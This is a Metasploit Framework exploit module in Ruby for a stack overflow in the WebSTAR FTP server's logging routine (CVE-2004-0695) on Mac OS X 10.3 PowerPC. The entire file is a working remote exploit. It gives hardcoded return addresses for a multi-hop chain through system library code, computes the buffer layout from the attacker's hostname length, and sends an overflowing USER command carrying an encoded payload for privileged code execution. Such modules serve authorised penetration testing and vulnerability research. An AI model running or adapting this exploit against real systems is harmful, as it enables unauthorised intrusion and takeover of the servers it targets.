##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'WebSTAR FTP Server USER Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the logging routine
				of the WebSTAR FTP server. Reliable code execution is
				obtained by a series of hops through the System library.
					
			},
			'Author'         => [ 'ddz', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2004-0695'],
					[ 'OSVDB', '7794'],
					[ 'BID', '10720'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 300,
					'BadChars' => "\x00\x20\x0a\x0d",
					'Compat'   =>
						{
							'ConnectionType' => "+find"
						},
				},
			'Targets'        => 
				[
					[
						'Mac OS X 10.3.4-10.3.6',
						{
							'Platform'     => 'osx',
							'Arch'          => ARCH_PPC,
							'Rets'          => [ 0x9008dce0, 0x90034d60, 0x900ca6d8, 0x90023590 ],
						},
					],
				],
			'DisclosureDate' => 'Jul 13 2004',
			'DefaultTarget' => 0))

	  	register_options(
		[
			OptString.new('MHOST', [ false, "Our IP address or hostname as the target resolves it" ]),
		], self)
					

	end

	# crazy dino 5-hop foo
	#$ret = pack('N', 0x9008dce0); # call $r28, jump r1+120
	#$r28 = pack('N', 0x90034d60); # getgid()
	#$ptr = pack('N', 0x900ca6d8); # r3 = r1 + 64, call $r30
	#$r30 = pack('N', 0x90023590); # call $r3

	def exploit
		connect
		
		# The offset to the return address is dependent on the length of our hostname
		# as the target system resolves it ( IP or reverse DNS ).
		mhost = datastore['MHOST'] || Rex::Socket.source_address(datastore['RHOST'])
		basel =  285 - mhost.length
		
		print_status("Trying target #{target.name}...")

		#  ret = 296
		# r25  = 260
		# r26  = 264
		# r27  = 268
		# r28  = 272
		# r29  = 276
		# r30  = 280
		# r31  = 284

		# r1+120 = 408
		
		buf                 = rand_text_alphanumeric(basel + 136 + 56, payload_badchars)
		buf[basel +  24, 4] = [ target['Rets'][0] ].pack('N') # call $r28, jump r1+120
		buf[basel      , 4] = [ target['Rets'][1] ].pack('N') # getgid()
		buf[basel + 136, 4] = [ target['Rets'][2] ].pack('N') # (r1+120) => r3 = r1 + 64, call $r30
		buf[basel + 120, 4] = [ target['Rets'][3] ].pack('N') # call $r3
		buf << payload.encoded

		send_cmd( ['USER', buf] , true )
		send_cmd( ['HELP'] , true )
		
		handler	
		disconnect
	end

end
